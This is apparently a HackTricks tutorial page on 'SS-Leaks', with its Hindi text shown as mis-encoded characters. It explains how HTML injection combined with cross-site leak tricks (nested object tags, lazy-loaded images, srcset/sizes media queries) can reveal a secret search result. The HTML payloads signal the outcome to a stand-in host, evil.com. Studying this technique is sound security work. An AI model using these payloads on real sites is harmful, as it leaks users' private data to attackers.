# рдПрд╕рдПрд╕-рд▓реАрдХреНрд╕

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХреНрд▓рд╛рдЙрдб тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж рдЯреНрд╡рд┐рдЯрд░ ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П рдЯреНрд╡рд┐рдЪ ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе рдпреВрдЯреНрдпреВрдм ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЗрдЪреНрдЫрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**рдж рдкреАрдПрд╕ рдлреИрдорд┐рд▓реА**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХрд▓ [**рдПрдирдПрдлрдЯреА**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ рдЦреЛрдЬреЗрдВ
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ** [**рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕-рдХреНрд▓рд╛рдЙрдб рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks-cloud) **рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред**

</details>

рдпрд╣ рдПрдХ **рдбреИрдВрдЧрд▓рд┐рдВрдЧ рдорд╛рд░реНрдХрдЕрдк рдФрд░ рдПрдХреНрд╕рдПрд╕-рд▓реАрдХреНрд╕** рдХрд╛ **рдорд┐рд╢реНрд░рдг** рд╣реИред рдПрдХ рдУрд░ рд╕рдВрдХрдЯрдЧреНрд░рд╕реНрддрддрд╛ рд╣рдореЗрдВ рдПрдХ рдкреГрд╖реНрда рдореЗрдВ HTML (рд▓реЗрдХрд┐рди рдирд╣реАрдВ JS) рдХреЛ **рдЗрдВрдЬреЗрдХреНрдЯ** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ, рдЬреЛ рд╣рдорд╛рд░реЗ рд╣рдорд▓реЗ рдХреЗ рд▓рдХреНрд╖реНрдп рдХреЗ **рд╕рдорд╛рди рдореВрд▓** рдХрд╛ рд╣реИред рджреВрд╕рд░реА рдУрд░ рд╣рдо рд╕реАрдзреЗ рдкреГрд╖реНрда рдкрд░ рд╣рдорд▓рд╛ рдирд╣реАрдВ рдХрд░реЗрдВрдЧреЗ рдЬрд╣рд╛рдВ рд╣рдо HTML рдХреЛ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдмрд▓реНрдХрд┐ **рджреВрд╕рд░реЗ рдкреГрд╖реНрда** рдкрд░ред

## рдиреЗрд╕реНрдЯреЗрдб рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕

рдпрджрд┐ <mark style="color:yellow;">`/api/v1/leaky?secret=a`</mark> рдПрдВрдбрдкреЙрдЗрдВрдЯ рдПрдХ 404 рд╕реНрдерд┐рддрд┐ рдХреЛрдб рд▓реМрдЯрд╛рддрд╛ рд╣реИ, рддреЛ рдЖрдВрддрд░рд┐рдХ `object` рд▓реЛрдб рд╣реЛрддрд╛ рд╣реИ, <mark style="color:yellow;">`https://evil.com?callback=a`</mark> рдХреЛ рдХреЙрд▓рдмреИрдХ рджреЗрддрд╛ рд╣реИ рдФрд░ рд╣рдореЗрдВ рдкрддрд╛ рдЪрд▓рддрд╛ рд╣реИ рдХрд┐ рдЦреЛрдЬ рдкреНрд░рд╢реНрди `a` рдХреЛрдИ рдкрд░рд┐рдгрд╛рдо рдирд╣реАрдВ рджрд┐рдпрд╛ред
```html
<object data="/api/v1/leaky?secret=a">
<object data="https://evil.com?callback=a"></object>
</object>
```
### рдЖрд▓рд╕реА рд▓реЛрдбрд┐рдВрдЧ

рдЕрдЧрд░ CSP рдмрд╛рд╣рд░реА рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЛ рдмреНрд▓реЙрдХ рдХрд░рддрд╛ рд╣реИ рддреЛ рдХреНрдпрд╛ рд╣реЛрдЧрд╛? рдиреАрдЪреЗ рджрд┐рдП рдЧрдП CSP рдХреЗ рд╕рд╛рде рдлрд┐рд░ рд╕реЗ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ:

<mark style="color:yellow;">`Content-Security-Policy: default-src 'self'; img-src *;`</mark>

рд╣рдорд╛рд░рд╛ рдЙрдкрдХрд░рдг `object` рдЕрдм рдХрд╛рдо рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИред рдЗрд╕рдХреЗ рд╕реНрдерд╛рди рдкрд░, рд╣рдо рдЫрд╡рд┐ [рдЖрд▓рд╕реА рд▓реЛрдбрд┐рдВрдЧ](https://developer.mozilla.org/en-US/docs/Web/Performance/Lazy\_loading) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ! рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЫрд╡рд┐ рдХреЗрд╡рд▓ рддрдм рд▓реЛрдб рд╣реЛрдЧреА рдЬрдм рдпрд╣ рджрд┐рдЦрд╛рдИ рджреЗрдЧреА рдФрд░ рд╡реНрдпреВрдкреЛрд░реНрдЯ рд╕реЗ рдПрдХ рдирд┐рд╢реНрдЪрд┐рдд рджреВрд░реА рдХреЗ рднреАрддрд░ рд╣реЛрдЧреАред
```html
<object data="/api/v1/leaky?secret=a">
<img src="https://evil.com?callback" loading="lazy">
</object>
```
### рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рд╢реАрд▓ рдЫрд╡рд┐рдпрд╛рдБ

рдЙрдкрд░реЛрдХреНрдд рддрдХрдиреАрдХ рдмрд╣реБрдд рдЕрдЪреНрдЫреА рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рджреГрд╢реНрдп рдХреНрд╖реЗрддреНрд░ рдореЗрдВ рд╣рдорд╛рд░реЗ HTML рдЗрдВрдЬреЗрдХреНрд╢рди рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд╣реИред

рдпрджрд┐ рдЗрдВрдЬреЗрдХреНрд╢рди рд╕реНрдХреНрд░реАрди рдХреЗ рдмрд╛рд╣рд░ рд╣реИ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реНрдХреНрд░реЙрд▓ рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ, рдХреНрдпрд╛ рд╣рдо рдлрд┐рд░ рднреА рдбреЗрдЯрд╛ рд▓реАрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ? рдмреЗрд╢рдХ, рд╣рдо рддрддреНрд╡ рдЖрдИрдбреА рдФрд░ [scroll-to-text-fragment](https://chromestatus.com/feature/4733392803332096) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ URL рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдПрдХ рд╕реНрдХреНрд░реЙрд▓ рдХреЛ рдмрд╛рдзреНрдп рдХрд░рддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдпреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рдВрд╡реЗрджрдирд╢реАрд▓рддрд╛ рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд╣реЛрддреЗ рд╣реИрдВ рдФрд░ рд╣рдореЗрдВ рдПрдХ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рджреБрдирд┐рдпрд╛ рдХреЗ рдкрд░рд┐рд╕реНрдерд┐рддрд┐ рдореЗрдВ рд╕рддреНрдпрд╛рдкрд┐рдд рд▓реАрдХ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреЗрддреЗред рдЖрджрд░реНрд╢ рд░реВрдк рд╕реЗ, рд╣рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд HTML рдЗрдВрдЬреЗрдХреНрд╢рди рдХреЛ рдПрдХ рд╕реБрд░рдХреНрд╖рд┐рдд рддрд░реАрдХреЗ рд╕реЗ рдЙрдкрдпреЛрдЧреА рдмрдирд╛рдирд╛ рд╣реИред

рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рд╢реАрд▓ рдЫрд╡рд┐рдпрд╛рдБ рдЖрдЗрдП! рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ, рдЫрд╡рд┐рдпреЛрдВ рдХреЗ `srcset` рдФрд░ `sizes` рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯреНрд╕ред

{% code overflow="wrap" %}
```html
<object data="/api/v1/leaky?secret=a">
<iframe srcdoc="<img srcset='https://evil.com?callback=1 480w, https://evil.com?callback=0 800w' sizes='(min-width: 1000px) 800px, (max-width 999px) 480px'>" width="1000px">
</object>
```
{% endcode %}

рдпрд╣рд╛рдБ рдХреБрдЫ рдмрд╛рддреЗрдВ рд╕рдордЭрдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИрдВред рдкрд╣рд▓реЗ, рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЕрдВрджрд░ рдХрд╛ iframe рдХреЗрд╡рд▓ рддрднреА рджрд┐рдЦрд╛рдИ рджреЗрдЧрд╛ рдЬрдм leaky endpoint рдПрдХ 404 рд╕реНрдерд┐рддрд┐ рдХреЛрдб рд╡рд╛рдкрд╕ рдХрд░реЗрдЧрд╛ред

рдпрд╣ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЕрдм рд╣рдо рджреЛ рдЕрд▓рдЧ-рдЕрд▓рдЧ URL рд╕реЗ iframe рдореЗрдВ рдЫрд╡рд┐ рдХреЛ рд╢рд░реНрддрд╛рдиреБрд╕рд╛рд░ рд▓реЛрдб рдХрд░реЗрдВрдЧреЗред `sizes` рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рд╣рдо рд╡реНрдпреВрдкреЛрд░реНрдЯ рд╕рд╛рдЗрдЬрд╝ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдЫрд╡рд┐ рдХреЛ рдХрд┐рд╕ URL рд╕реЗ рд▓реЛрдб рдХрд░рдирд╛ рд╣реИ, рдЙрд╕реЗ рдЪреБрдирдиреЗ рдХреЗ рд▓рд┐рдП [рдореАрдбрд┐рдпрд╛ рдХреНрд╡реЗрд░реА](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS\_media\_queries/Using\_media\_queries) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

{% code overflow="wrap" %}
```html
<img
srcset='https://evil.com?callback=0 800w, https://evil.com?callback=1 480w'
sizes='(min-width: 1000px) 800px, (max-width 999px) 480px'
>
```
{% endcode %}

рдХреНрдпреЛрдВрдХрд┐ рд╣рдорд╛рд░реЗ iframe рдореЗрдВ `width="1000px"` рд╣реИ, рдЗрд╕рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╣реЛрддрд╛ рд╣реИ:

1. рдпрджрд┐ рд▓реАрдХреА рдПрдВрдбрдкреЙрдЗрдВрдЯ рдПрдХ 404 рд╕реНрдерд┐рддрд┐ рдХреЛрдб рд╡рд╛рдкрд╕ рдХрд░рддрд╛ рд╣реИ, рддреЛ iframe рдкреНрд░рджрд░реНрд╢рд┐рдд рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдЗрд╕рдХреА рдЪреМрдбрд╝рд╛рдИ 1000px рд╣реЛрддреА рд╣реИред iframe рдХреЗ рднреАрддрд░реА рдЫрд╡рд┐ `(min-width: 1000px)` рдореАрдбрд┐рдпрд╛ рдХреНрд╡реЗрд░реА рдХреЗ рд╕рд╛рде рдореЗрд▓ рдЦрд╛рддреА рд╣реИ рдФрд░ `https://evil.com?callback=0` рд╕реЗ 800px рдЫрд╡рд┐ рд▓реЛрдб рдХрд░рддреА рд╣реИред
2. рдпрджрд┐ рд▓реАрдХреА рдПрдВрдбрдкреЙрдЗрдВрдЯ рдПрдХ 200 рд╕реНрдерд┐рддрд┐ рдХреЛрдб рд╡рд╛рдкрд╕ рдХрд░рддрд╛ рд╣реИ, рддреЛ iframe рдкреНрд░рджрд░реНрд╢рд┐рдд рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИред рдЪреМрдбрд╝рд╛рдИ 999px рд╕реЗ рдХрдо рд╣реЛрдиреЗ рдХреЗ рдХрд╛рд░рдг рдЫрд╡рд┐ рдмрдбрд╝реЗ iframe рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рдирд╣реАрдВ рд╣реЛрдиреЗ рдХреЗ рд░реВрдк рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗрддреА рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрд╣ `(max-width 999px)` рдореАрдбрд┐рдпрд╛ рдХреНрд╡реЗрд░реА рдХреЗ рд╕рд╛рде рдореЗрд▓ рдЦрд╛рддреА рд╣реИ рдФрд░ `https://evil.com?callback=1` рд╕реЗ 480px рдЫрд╡рд┐ рд▓реЛрдб рдХрд░рддреА рд╣реИред

## рд╕рдВрджрд░реНрдн

* [https://infosec.zeyu2001.com/2023/from-xs-leaks-to-ss-leaks](https://infosec.zeyu2001.com/2023/from-xs-leaks-to-ss-leaks)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks** рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ред
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдХрд╛** рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВред**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛред**

</details>
